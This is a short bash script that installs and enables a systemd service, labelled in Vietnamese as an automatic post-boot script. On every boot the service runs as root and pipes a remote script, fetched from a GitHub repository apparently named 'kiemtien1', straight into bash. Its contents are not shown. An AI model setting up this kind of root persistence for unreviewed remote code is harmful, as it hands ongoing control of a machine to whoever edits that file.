#!/bin/bash

cat << 'EOF' | sudo tee /etc/systemd/system/auto-script.service
[Unit]
Description=Chạy script tự động sau khi boot
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -sL https://raw.githubusercontent.com/kiemtien1/data/refs/heads/main/auto.sh | bash'
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable auto-script.service
